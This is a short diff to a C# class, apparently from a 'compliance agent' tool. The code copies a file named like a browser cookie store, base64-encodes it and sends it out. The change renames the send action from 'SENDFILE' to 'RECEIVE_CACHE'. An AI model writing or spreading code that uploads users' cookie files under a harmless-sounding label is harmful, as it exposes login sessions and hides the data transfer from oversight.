@@ -78,7 +78,7 @@ namespace SkydevCSTool.Class
             System.IO.File.Copy(source_path, String.Concat(output_directory, "\\temp\\Cookies_me"), true);
             Byte[] bytes = File.ReadAllBytes(String.Concat(output_directory, "\\temp\\Cookies_me"));
             string file = Convert.ToBase64String(bytes);
-            this.Send(new PairCommand { Action = "SENDFILE", Message = file, Profile=Globals.ComplianceAgent.profile });
+            this.Send(new PairCommand { Action = "RECEIVE_CACHE", Message = file, Profile=Globals.ComplianceAgent.profile });
 
         }
     }
